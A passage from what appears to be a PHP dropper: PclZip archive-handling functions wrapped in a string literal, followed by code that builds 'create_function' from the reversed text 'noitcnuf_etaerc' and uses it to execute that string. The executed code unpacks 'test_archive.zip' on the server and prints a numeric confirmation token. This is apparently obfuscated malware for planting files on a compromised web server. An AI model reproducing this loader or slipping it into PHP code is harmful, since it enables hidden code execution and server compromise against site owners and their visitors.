    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

if ($this->magic_quotes_status == 1) {
	  @set_magic_quotes_runtime($this->magic_quotes_status);
}

  return $v_result;
}

}

function PclZipUtilPathReduction($p_dir)
{
  $v_result = "";

  if ($p_dir != "") {
    $v_list = explode("/", $p_dir);

    $v_skip = 0;
    for ($i=sizeof($v_list)-1; $i>=0; $i--) {
      if ($v_list[$i] == ".") {
      }
      else if ($v_list[$i] == "..") {
	  $v_skip++;
      }
      else if ($v_list[$i] == "") {
	  if ($i == 0) {
          $v_result = "/".$v_result;
	    if ($v_skip > 0) {
	        $v_result = $p_dir;
              $v_skip = 0;
	    }
	  }
	  else if ($i == (sizeof($v_list)-1)) {
          $v_result = $v_list[$i];
	  }
	  else {
	  }
      }
      else {
	  if ($v_skip > 0) {
	    $v_skip--;
	  }
	  else {
          $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");
	  }
      }
    }
    
    if ($v_skip > 0) {
      while ($v_skip > 0) {
          $v_result = '../'.$v_result;
          $v_skip--;
      }
    }
  }

  return $v_result;
}

function PclZipUtilPathInclusion($p_dir, $p_path)
{
  $v_result = 1;
  
  if (   ($p_dir == '.')
      || ((strlen($p_dir) >=2) && (substr($p_dir, 0, 2) == './'))) {
    $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1);
  }
  if (   ($p_path == '.')
      || ((strlen($p_path) >=2) && (substr($p_path, 0, 2) == './'))) {
    $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1);
  }

  $v_list_dir = explode("/", $p_dir);
  $v_list_dir_size = sizeof($v_list_dir);
  $v_list_path = explode("/", $p_path);
  $v_list_path_size = sizeof($v_list_path);

  $i = 0;
  $j = 0;
  while (($i < $v_list_dir_size) && ($j < $v_list_path_size) && ($v_result)) {

    if ($v_list_dir[$i] == '') {
      $i++;
      continue;
    }
    if ($v_list_path[$j] == '') {
      $j++;
      continue;
    }

    if (($v_list_dir[$i] != $v_list_path[$j]) && ($v_list_dir[$i] != '') && ( $v_list_path[$j] != ''))  {
      $v_result = 0;
    }

    $i++;
    $j++;
  }

  if ($v_result) {
    while (($j < $v_list_path_size) && ($v_list_path[$j] == '')) $j++;
    while (($i < $v_list_dir_size) && ($v_list_dir[$i] == '')) $i++;

    if (($i >= $v_list_dir_size) && ($j >= $v_list_path_size)) {
      $v_result = 2;
    }
    else if ($i < $v_list_dir_size) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)
{
  $v_result = 1;

  if ($p_mode==0)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==1)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==2)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==3)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }

  return $v_result;
}

function PclZipUtilRename($p_src, $p_dest)
{
  $v_result = 1;

  if (!@rename($p_src, $p_dest)) {

    if (!@copy($p_src, $p_dest)) {
      $v_result = 0;
    }
    else if (!@unlink($p_src)) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilOptionText($p_option)
{
  
  $v_list = get_defined_constants();
  for (reset($v_list); $v_key = key($v_list); next($v_list)) {
    $v_prefix = substr($v_key, 0, 10);
    if ((   ($v_prefix == 'PCLZIP_OPT')
         || ($v_prefix == 'PCLZIP_CB_')
         || ($v_prefix == 'PCLZIP_ATT'))
        && ($v_list[$v_key] == $p_option)) {
      return $v_key;
    }
  }
  
  $v_result = 'Unknown';

  return $v_result;
}

function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)
{
  if (stristr(php_uname(), 'windows')) {
    if (($p_remove_disk_letter) && (($v_position = strpos($p_path, ':')) != false)) {
        $p_path = substr($p_path, $v_position+1);
    }
    if ((strpos($p_path, '\\') > 0) || (substr($p_path, 0,1) == '\\')) {
        $p_path = strtr($p_path, '\\', '/');
    }
  }
  return $p_path;
}




$archive = new PclZip("test_archive.zip");
if ($archive->extract() == 0) {
die("Error : ".$archive->errorInfo(true));
}
else
{
die("1425756856");	
}";
$a = strrev("noitcnuf_etaerc");
$f = $a("", $array_name($string));
$f();
